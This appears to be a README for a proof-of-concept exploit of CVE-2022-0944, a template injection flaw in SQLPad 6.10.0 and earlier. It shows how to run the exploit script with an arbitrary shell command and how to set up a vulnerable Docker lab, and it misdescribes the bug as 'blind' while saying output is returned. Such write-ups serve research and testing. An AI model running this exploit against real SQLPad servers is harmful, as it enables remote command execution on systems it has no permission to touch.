# CVE-2022-0944
SQLPad - Template injection

This is a blind vulnerability, meaning that the output is directly returned in the response.

## Exploit
Use the script with the following command:  
`python3 exploit.py --url http://localhost:13000 --command 'ls -la > /tmp/test' --username admin --password password`

### Output
```
[*] Login was successfull
[*] Exploited!
```

## Testing environment
Using docker:
- Start the docker container - `sudo docker run -p 13000:3000 -d --env SQLPAD_ADMIN=admin --env SQLPAD_ADMIN_PASSWORD=password --name vulnerable-sqlpad sqlpad/sqlpad:6.10.0`
- Connect to the docker container - `sudo docker exec -it vulnerable-sqlpad /bin/bash`

To access the web interface, use URL `http://localhost:13000` with credentials `admin:password`.

## Affected versions
<= 6.10.0

## Source
https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb

## Disclaimer
Use only for educational purposes or CTF challenges.
